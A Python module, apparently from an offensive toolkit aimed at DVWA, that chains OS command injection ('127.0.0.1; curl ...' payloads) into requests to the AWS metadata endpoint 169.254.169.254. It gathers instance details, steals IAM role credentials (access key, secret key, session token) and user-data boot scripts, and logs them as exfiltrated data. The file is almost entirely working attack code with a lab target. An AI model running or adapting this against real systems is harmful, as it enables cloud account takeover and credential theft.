"""
Cloud Exploitation Module
AWS IMDS 탈취 및 클라우드 메타데이터 수집 모듈
"""

import time
import re
from utils.logger import log_attack, log_exfiltrated_data

# AWS IMDS v1 엔드포인트
IMDS_V1_ENDPOINTS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data',
    'http://169.254.169.254/latest/dynamic/instance-identity/document',
]

# AWS IMDS v2 엔드포인트 (토큰 기반)
IMDS_V2_TOKEN_URL = 'http://169.254.169.254/latest/api/token'

# 수집할 중요 메타데이터
METADATA_PATHS = {
    'instance_info': [
        'instance-id',
        'instance-type',
        'local-hostname',
        'local-ipv4',
        'public-hostname',
        'public-ipv4',
        'placement/availability-zone',
        'placement/region',
    ],
    'iam_credentials': [
        'iam/security-credentials/',
    ],
    'network_info': [
        'network/interfaces/macs/',
        'mac',
    ],
    'user_data': [
        '../user-data',
    ],
}

def run_attack(session, delay=1):
    """
    AWS IMDS 탈취 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'imds_accessible': False,
            'metadata': {},
            'iam_credentials': None,
            'user_data': None
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] AWS IMDS 탈취 및 클라우드 메타데이터 수집")
    print("  [*] ===========================================\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # 1단계: IMDS 접근 가능 여부 확인
    print("  [1/4] IMDS 접근 가능 여부 확인 중...")
    if check_imds_access(session, cmdi_url, results, delay):
        print("    [+] IMDS 접근 가능!")
        results['findings']['imds_accessible'] = True

        # 2단계: 인스턴스 메타데이터 수집
        print("\n  [2/4] 인스턴스 메타데이터 수집 중...")
        collect_instance_metadata(session, cmdi_url, results, delay)

        # 3단계: IAM 자격 증명 탈취 시도
        print("\n  [3/4] IAM 자격 증명 탈취 시도 중...")
        steal_iam_credentials(session, cmdi_url, results, delay)

        # 4단계: User Data 수집
        print("\n  [4/4] User Data 수집 중...")
        collect_user_data(session, cmdi_url, results, delay)
    else:
        print("    [-] IMDS 접근 불가 (EC2 인스턴스가 아니거나 차단됨)")

    if results['successful'] > 0:
        results['success'] = True

    print_cloud_exploit_summary(results)
    return results

def check_imds_access(session, cmdi_url, results, delay):
    """IMDS 접근 가능 여부 확인"""
    results['attempts'] += 1

    try:
        # curl을 사용하여 IMDS 기본 엔드포인트 확인
        cmd = "curl -s -m 2 http://169.254.169.254/latest/meta-data/"
        payload = f"127.0.0.1; {cmd}"
        data = {'ip': payload, 'Submit': 'Submit'}

        response = session.session.post(cmdi_url, data=data)
        output = extract_command_output(response.text)

        # IMDS 응답에는 일반적으로 ami-id, instance-id 등의 경로가 포함됨
        if output and any(keyword in output.lower() for keyword in ['ami-id', 'instance-id', 'iam', 'hostname']):
            results['successful'] += 1
            log_attack(
                'IMDS_ACCESS_CHECK',
                'SUCCESS',
                'IMDS endpoint accessible',
                response.status_code,
                len(response.text)
            )
            return True
        else:
            log_attack(
                'IMDS_ACCESS_CHECK',
                'FAILED',
                'IMDS not accessible',
                response.status_code,
                len(response.text)
            )
            return False

        time.sleep(delay)

    except Exception as e:
        log_attack('IMDS_ACCESS_CHECK', 'ERROR', f"Error: {str(e)}", 0, 0)
        return False

def collect_instance_metadata(session, cmdi_url, results, delay):
    """인스턴스 메타데이터 수집"""

    for category, paths in METADATA_PATHS.items():
        if category == 'iam_credentials' or category == 'user_data':
            continue

        print(f"    [*] {category} 수집 중...")

        for path in paths:
            results['attempts'] += 1

            try:
                cmd = f"curl -s -m 2 http://169.254.169.254/latest/meta-data/{path}"
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 0:
                    results['successful'] += 1

                    if category not in results['findings']['metadata']:
                        results['findings']['metadata'][category] = {}

                    results['findings']['metadata'][category][path] = output

                    # 로그에 기록
                    log_exfiltrated_data(
                        f"IMDS - {category}/{path}",
                        cmd,
                        output,
                        preview_length=500
                    )

                    log_attack(
                        'IMDS_METADATA',
                        'SUCCESS',
                        f"Category: {category}, Path: {path}",
                        response.status_code,
                        len(response.text)
                    )

                    print(f"      [+] {path}: {output[:50]}..." if len(output) > 50 else f"      [+] {path}: {output}")

                time.sleep(delay)

            except Exception as e:
                log_attack('IMDS_METADATA', 'ERROR', f"Path: {path}, Error: {str(e)}", 0, 0)

def steal_iam_credentials(session, cmdi_url, results, delay):
    """IAM 자격 증명 탈취"""
    results['attempts'] += 1

    try:
        # 1. IAM 역할 이름 확인
        cmd = "curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        payload = f"127.0.0.1; {cmd}"
        data = {'ip': payload, 'Submit': 'Submit'}

        response = session.session.post(cmdi_url, data=data)
        role_name = extract_command_output(response.text).strip()

        if role_name:
            print(f"    [+] IAM 역할 발견: {role_name}")
            results['successful'] += 1

            log_attack(
                'IAM_ROLE_DISCOVERY',
                'SUCCESS',
                f"Role: {role_name}",
                response.status_code,
                len(response.text)
            )

            time.sleep(delay)
            results['attempts'] += 1

            # 2. IAM 자격 증명 탈취
            cmd = f"curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
            payload = f"127.0.0.1; {cmd}"
            data = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.post(cmdi_url, data=data)
            credentials = extract_command_output(response.text)

            if credentials and len(credentials) > 50:
                results['successful'] += 1
                results['findings']['iam_credentials'] = credentials

                # 자격 증명 로그 기록 (매우 중요!)
                log_exfiltrated_data(
                    f"AWS IAM Credentials - {role_name}",
                    cmd,
                    credentials,
                    preview_length=2000
                )

                log_attack(
                    'IAM_CREDENTIALS_THEFT',
                    'SUCCESS',
                    f"Stolen credentials for role: {role_name}",
                    response.status_code,
                    len(response.text)
                )

                print(f"    [+] IAM 자격 증명 탈취 성공! ({len(credentials)} bytes)")
                print(f"        AccessKeyId, SecretAccessKey, Token 획득!")
            else:
                print(f"    [-] IAM 자격 증명 탈취 실패")
        else:
            print(f"    [-] IAM 역할 없음")

        time.sleep(delay)

    except Exception as e:
        log_attack('IAM_CREDENTIALS_THEFT', 'ERROR', f"Error: {str(e)}", 0, 0)

def collect_user_data(session, cmdi_url, results, delay):
    """User Data 수집 (부팅 스크립트, 설정 등)"""
    results['attempts'] += 1

    try:
        cmd = "curl -s -m 2 http://169.254.169.254/latest/user-data"
        payload = f"127.0.0.1; {cmd}"
        data = {'ip': payload, 'Submit': 'Submit'}

        response = session.session.post(cmdi_url, data=data)
        user_data = extract_command_output(response.text)

        if user_data and len(user_data) > 10:
            results['successful'] += 1
            results['findings']['user_data'] = user_data

            # User Data 로그 기록
            log_exfiltrated_data(
                "AWS User Data (Boot Script)",
                cmd,
                user_data,
                preview_length=1500
            )

            log_attack(
                'USER_DATA_COLLECTION',
                'SUCCESS',
                'User data collected',
                response.status_code,
                len(response.text)
            )

            print(f"    [+] User Data 수집 성공 ({len(user_data)} bytes)")

            # User Data에 민감 정보가 있는지 체크
            sensitive_patterns = ['password', 'secret', 'api_key', 'token', 'credential']
            found_sensitive = [p for p in sensitive_patterns if p in user_data.lower()]
            if found_sensitive:
                print(f"    [!] 민감 정보 발견 가능성: {', '.join(found_sensitive)}")
        else:
            print(f"    [-] User Data 없음")

        time.sleep(delay)

    except Exception as e:
        log_attack('USER_DATA_COLLECTION', 'ERROR', f"Error: {str(e)}", 0, 0)

def extract_command_output(html_response):
    """HTML 응답에서 명령어 출력 추출"""
    try:
        # <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            # textarea에서 추출
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 제거
        lines = output.split('\n')
        filtered_lines = []
        skip_ping = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                skip_ping = True
                continue
            if skip_ping and 'packets transmitted' in line.lower():
                skip_ping = False
                continue
            if not skip_ping and line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def print_cloud_exploit_summary(results):
    """클라우드 탈취 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] AWS IMDS 탈취 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings['imds_accessible']:
        print(f"  [+] IMDS 접근: 가능")

        if findings['metadata']:
            print(f"  [+] 메타데이터: {len(findings['metadata'])}개 카테고리 수집")
            for category, data in findings['metadata'].items():
                print(f"      - {category}: {len(data)}개 항목")

        if findings['iam_credentials']:
            print(f"  [!] IAM 자격 증명: 탈취 성공! (고위험)")

        if findings['user_data']:
            print(f"  [+] User Data: 수집 완료")
    else:
        print(f"  [-] IMDS 접근: 불가능")

    print()
